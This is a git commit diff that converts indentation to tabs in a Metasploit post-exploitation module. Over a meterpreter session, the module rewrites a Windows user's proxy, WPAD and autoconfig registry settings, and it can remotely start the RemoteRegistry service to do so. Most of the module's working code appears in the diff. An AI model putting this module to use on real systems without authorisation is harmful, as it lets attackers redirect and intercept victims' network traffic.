e190802da9c2b9964b633899c15c4e054c372c72
Rob Fuller <jd.mubix@gmail.com>
2013-03-31 21:12:38 -0400

    fix indentations from spaces to tabs

--- set_proxy.rb
+++ set_proxy.rb
@@ -10,81 +10,81 @@ require 'msf/core/post/windows/services'
 
 class Metasploit3 < Msf::Post
 
-        include Post::Windows::Services
+		include Post::Windows::Services
 
 	DEBUG = false
 
-        def initialize
-                super(
-                        'Name'        => 'Windows Set Proxy Setting',
-                        'Description'    => %q{
-                                This module pulls a user's proxy settings. If neither RHOST or SID
-                                are set it pulls the current user, else it will pull the user's settings
-                                specified SID and target host.
-                        },
-                        'Author'      => [
+		def initialize
+				super(
+						'Name'        => 'Windows Set Proxy Setting',
+						'Description'    => %q{
+								This module pulls a user's proxy settings. If neither RHOST or SID
+								are set it pulls the current user, else it will pull the user's settings
+								specified SID and target host.
+						},
+						'Author'      => [
 						'mubix',	# enum_proxy.rb
 						'surefire'	# Added ability to configure proxy
 						],
-                        'License'     => MSF_LICENSE,
-                        'Platform'      => [ 'win' ],
-                        'SessionTypes'  => [ 'meterpreter' ]
-                )
+						'License'     => MSF_LICENSE,
+						'Platform'      => [ 'win' ],
+						'SessionTypes'  => [ 'meterpreter' ]
+				)
 
-                register_options(
-                        [
-                                OptAddress.new('RHOST',         [ false, 'Remote host to clone settings to, defaults to local' ]),
-                                OptString.new( 'SID',           [ false, 'SID of user to clone settings to (SYSTEM is S-1-5-18)' ]),
-                                OptString.new( 'SINGLEPROXY',   [ false, 'Provide HOST:PORT setting of proxy server for all protocols']),
-                                OptString.new( 'HTTPPROXY',     [ false, 'Provide HOST:PORT setting of proxy server for HTTP protocols']),
-                                OptString.new( 'HTTPSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for HTTPS protocols']),
-                                OptString.new( 'FTPPROXY',      [ false, 'Provide HOST:PORT setting of proxy server for FTP protocols']),
-                                OptString.new( 'SOCKSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for SOCKS protocols']),
-                                OptString.new( 'AUTOCONFIGURL', [ false, 'Provide URL to configuration file for AutoConfig functionality']),
-                                OptString.new( 'EXCEPTIONS',    [ false, 'Exclude proxying for hosts beginning with (semicolon-delimited).  Use "<local>" to "Bypass Proxy Server for Local Addresses"']),
-                                OptBool.new(   'WPAD',          [ true,  'Enable/disable WPAD.  ("Automatically detect settings")']),
-                                OptBool.new(   'AUTOCONFIG',    [ true,  'Enable/disable AutoConfig. ("Use automatic configuration script")']),
-                                OptBool.new(   'ENABLE',        [ true,  'Enable/disable proxy server. ("Use a proxy server for your LAN")'])
-                        ], self.class)
-        end
+				register_options(
+						[
+								OptAddress.new('RHOST',         [ false, 'Remote host to clone settings to, defaults to local' ]),
+								OptString.new( 'SID',           [ false, 'SID of user to clone settings to (SYSTEM is S-1-5-18)' ]),
+								OptString.new( 'SINGLEPROXY',   [ false, 'Provide HOST:PORT setting of proxy server for all protocols']),
+								OptString.new( 'HTTPPROXY',     [ false, 'Provide HOST:PORT setting of proxy server for HTTP protocols']),
+								OptString.new( 'HTTPSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for HTTPS protocols']),
+								OptString.new( 'FTPPROXY',      [ false, 'Provide HOST:PORT setting of proxy server for FTP protocols']),
+								OptString.new( 'SOCKSPROXY',    [ false, 'Provide HOST:PORT setting of proxy server for SOCKS protocols']),
+								OptString.new( 'AUTOCONFIGURL', [ false, 'Provide URL to configuration file for AutoConfig functionality']),
+								OptString.new( 'EXCEPTIONS',    [ false, 'Exclude proxying for hosts beginning with (semicolon-delimited).  Use "<local>" to "Bypass Proxy Server for Local Addresses"']),
+								OptBool.new(   'WPAD',          [ true,  'Enable/disable WPAD.  ("Automatically detect settings")']),
+								OptBool.new(   'AUTOCONFIG',    [ true,  'Enable/disable AutoConfig. ("Use automatic configuration script")']),
+								OptBool.new(   'ENABLE',        [ true,  'Enable/disable proxy server. ("Use a proxy server for your LAN")'])
+						], self.class)
+		end
 
-        def run
-                if datastore['SID']
-                        root_key, base_key = session.sys.registry.splitkey("HKU\\#{datastore['SID']}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
-                else
-                        root_key, base_key = session.sys.registry.splitkey("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
-                end
+		def run
+				if datastore['SID']
+						root_key, base_key = session.sys.registry.splitkey("HKU\\#{datastore['SID']}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
+				else
+						root_key, base_key = session.sys.registry.splitkey("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
+				end
 
-                if datastore['RHOST']
-                        begin
-                                key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
-                        rescue ::Rex::Post::Meterpreter::RequestError
-                                print_error("Unable to contact remote registry service on #{datastore['RHOST']}")
-                                print_status("Attempting to start service remotely...")
-                                begin
-                                        service_start('RemoteRegistry',datastore['RHOST'])
-                                rescue
-                                        print_error('Unable to read registry or start the service, exiting...')
-                                        return
-                                end
+				if datastore['RHOST']
+						begin
+								key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
+						rescue ::Rex::Post::Meterpreter::RequestError
+								print_error("Unable to contact remote registry service on #{datastore['RHOST']}")
+								print_status("Attempting to start service remotely...")
+								begin
+										service_start('RemoteRegistry',datastore['RHOST'])
+								rescue
+										print_error('Unable to read registry or start the service, exiting...')
+										return
+								end
 			if (datastore['HTTPPROXY'] or datastore['HTTPSPROXY'] or datastore['FTPPROXY'] or datastore['GOPHERPROXY'] or datastore['SOCKSPROXY'])
 				print_error "FATAL ERROR: SINGLEPROXY cannot be defined with other proxies.  Aborting."
 				return false
 			end
-                                startedreg = true
-                                key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
-                        end
-                        open_key = key.create_key(base_key, KEY_WRITE + KEY_READ + 0x0000)
-                else
-                        open_key = session.sys.registry.create_key(root_key, base_key, KEY_WRITE + KEY_READ + 0x0000)
-                end
+								startedreg = true
+								key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
+						end
+						open_key = key.create_key(base_key, KEY_WRITE + KEY_READ + 0x0000)
+				else
+						open_key = session.sys.registry.create_key(root_key, base_key, KEY_WRITE + KEY_READ + 0x0000)
+				end
 
 		# Get current proxy configuration
 		begin
-	                values = open_key.query_value('DefaultConnectionSettings')
+					values = open_key.query_value('DefaultConnectionSettings')
 		rescue
 			print_error "FATAL ERROR: Unable to read registry key.  (Does the key exist?)  Aborting."
-	                service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
+					service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
 			return -1
 		end
 
@@ -92,23 +92,23 @@ class Metasploit3 < Msf::Post
 		retVal = queryProxy(values.data)
 		if not retVal
 			print_error "FATAL ERROR: Unrecognized proxy configuration.  Restore from known-good config.  Aborting."
-	                service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
+					service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
 			return -1
 		end
 
 		# Push user-supplied proxy configuration (and display the results)
-                newSettings = configureProxy(values.data)
+				newSettings = configureProxy(values.data)
 		print_status "-----   NEW SETTINGS   -----"
 		queryProxy(newSettings) if newSettings
 
-                # If we started the Remote Registry service, we need to stop it.
-                service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
+				# If we started the Remote Registry service, we need to stop it.
+				service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
 
 		print "\n"
-        end
+		end
 
-        def configureProxy(current)
-                internetSettings_key = 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections'
+		def configureProxy(current)
+				internetSettings_key = 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections'
 
 		new = current
 
@@ -125,17 +125,17 @@ class Metasploit3 < Msf::Post
 		new = configureAutoconfigUrl(new)
 
 		if new
-	        	retVal = registry_setvaldata(internetSettings_key,'DefaultConnectionSettings',new.to_s(),"REG_BINARY")
+				retVal = registry_setvaldata(internetSettings_key,'DefaultConnectionSettings',new.to_s(),"REG_BINARY")
 			if not retVal
-        		        print_error "ERROR: Unable to modify ProxyEnable setting. (Returned error code: #{retVal.to_i()})"
+						print_error "ERROR: Unable to modify ProxyEnable setting. (Returned error code: #{retVal.to_i()})"
 				return false
-	        	end
+				end
 		else
 			print_error "FATAL ERROR: Invalid confiugration data.  Not modifying the target's configuration."
 		end
 
 		return new
-        end
+		end
 
 	def queryProxy(data)
 		i = 0
@@ -168,20 +168,20 @@ class Metasploit3 < Msf::Post
 		proxySetting = queryProxySetting((data[8,1].unpack('C*'))[0])
 		return false if not proxySetting
 
-                print_status "Proxy Counter: #{(data[4,1].unpack('C*'))[0]}"
+				print_status "Proxy Counter: #{(data[4,1].unpack('C*'))[0]}"
 		print_status "Proxy Setting: #{proxySetting}"
 
-                cursor = 12
-                proxyserver = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
-                print_status "Proxy Server:  #{proxyserver}" if proxyserver != ""
+				cursor = 12
+				proxyserver = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
+				print_status "Proxy Server:  #{proxyserver}" if proxyserver != ""
 
-                cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
-                additionalinfo = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
-                print_status "Exceptions:    #{additionalinfo}" if additionalinfo != ""
+				cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
+				additionalinfo = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
+				print_status "Exceptions:    #{additionalinfo}" if additionalinfo != ""
 
-                cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
-                autoconfigurl = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
-       	        print_status "AutoConfigURL: #{autoconfigurl}" if autoconfigurl != ""
+				cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
+				autoconfigurl = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
+				print_status "AutoConfigURL: #{autoconfigurl}" if autoconfigurl != ""
 
 		return true
 	end
@@ -190,8 +190,8 @@ class Metasploit3 < Msf::Post
 		text = []
 		text[1] = "No proxy settings (#{byte})"
 		text[3] = "Proxy server (#{byte})"
-                text[5] = "Set proxy via AutoConfigure script (#{byte})"
-                text[7] = "Proxy server and AutoConfigure script (#{byte})"
+				text[5] = "Set proxy via AutoConfigure script (#{byte})"
+				text[7] = "Proxy server and AutoConfigure script (#{byte})"
 		text[9] = "WPAD (#{byte})"
 		text[11] = "WPAD and Proxy server (#{byte})"
 		text[13] = "WPAD and AutoConfigure script (#{byte})"
